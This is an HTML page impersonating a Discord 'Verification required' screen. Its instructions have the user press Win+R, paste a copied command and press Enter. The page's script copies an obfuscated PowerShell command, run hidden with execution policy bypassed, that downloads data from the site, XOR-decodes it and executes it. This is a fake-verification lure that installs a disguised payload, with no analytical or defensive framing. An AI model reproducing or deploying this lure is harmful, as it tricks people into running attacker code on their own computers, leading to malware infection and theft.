<style>
*{box-sizing:border-box}
body{margin:0;min-height:100vh;display:grid;place-items:center;padding:40px 20px;
  background:radial-gradient(circle at 50% 0%,#2b2d31 0%,#1e1f22 55%,#111214 100%);
  font-family:'gg sans','Noto Sans',Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
.card{width:440px;max-width:100%;background:#313338;border-radius:8px;padding:28px 24px 20px;
  box-shadow:0 8px 32px rgba(0,0,0,.45);animation:in .3s ease-out}
@keyframes in{from{opacity:0;transform:translateY(8px) scale(.99)}to{opacity:1;transform:none}}
.brand{display:flex;align-items:center;gap:10px;margin-bottom:18px}
.brand span{color:#f2f3f5;font-size:15px;font-weight:600;letter-spacing:.2px}
h1{margin:0 0 8px;font-size:20px;font-weight:600;color:#f2f3f5}
p{margin:0 0 18px;font-size:14px;line-height:1.4;color:#b5bac1}
ol{margin:0 0 14px;padding-left:20px;font-size:14px;line-height:1.75;color:#dbdee1}
ol b{color:#f2f3f5}
.code{background:#1e1f22;border:1px solid #26272b;border-radius:4px;padding:12px 14px;margin-bottom:16px;
  font-family:Consolas,'Courier New',monospace;font-size:12px;color:#7ee787;white-space:nowrap;overflow-x:auto}
button{width:100%;background:#5865F2;color:#fff;border:none;border-radius:4px;padding:12px;
  font-size:15px;font-weight:500;font-family:inherit;cursor:pointer;transition:background .15s}
button:hover{background:#4752C4}
button.ok{background:#248046}
.foot{margin-top:14px;text-align:center;font-size:12px;color:#80848e}
</style>

    <span>Discord</span>
  </div>
  <h1>Verification required</h1>
  <p>Complete the check below to continue.</p>
  <ol>
    <li>Press <b>Win</b> + <b>R</b></li>
    <li>Press <b>Ctrl</b> + <b>V</b> to paste</li>
    <li>Press <b>Enter</b> and wait a few seconds</li>
  </ol>
  <div class="code" id="cmd">loading…</div>
  <button id="b">Copy command</button>
  <div class="foot">Verification is done automatically in the background</div>
</div>
<script>
var t='explorer.exe powershell -nop -w h -ep bypass -c "$b=[Convert]::FromBase64String((irm '+location.origin+'/a));for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor 37};&([scriptblock]::Create([Text.Encoding]::UTF8.GetString($b)))"';
document.getElementById('cmd').textContent=t;
document.getElementById('b').onclick=function(){
  var b=this;
  function ok(){b.textContent='Copied';b.className='ok';setTimeout(function(){b.textContent='Copy command';b.className='';},2200);}
  function fb(){var a=document.createElement('textarea');a.value=t;document.body.appendChild(a);a.select();try{document.execCommand('copy');ok()}catch(e){}document.body.removeChild(a);}
  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(ok).catch(fb)}else{fb()}
};
</script>
